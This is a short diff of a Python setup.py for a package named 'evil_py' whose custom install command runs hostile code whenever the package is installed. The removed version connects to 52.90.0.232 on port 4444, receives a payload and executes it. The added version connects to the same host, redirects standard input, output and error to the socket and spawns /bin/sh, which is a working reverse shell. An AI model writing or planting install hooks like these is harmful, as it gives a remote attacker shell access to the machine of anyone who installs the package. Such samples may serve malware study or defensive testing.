@@ -1,21 +1,16 @@
 import socket, struct, time, os
 import setuptools
 from setuptools.command.install import install
+import socket,os,pty
 
 class evil_py_class(install):
   def run(self):
-    for x in range(10):
-      try:
-        s=socket.socket(2,socket.SOCK_STREAM)
-        s.connect(('52.90.0.232', 4444))
-        break
-      except:
-        time.sleep(5)
-    l=struct.unpack('>I',s.recv(4))[0]
-    d=s.recv(l)
-    while len(d)<l:
-      d+=s.recv(l-len(d))
-    exec(d,{'s':s})
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("52.90.0.232",4444))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/sh")
 
 setuptools.setup(
   name="evil_py",
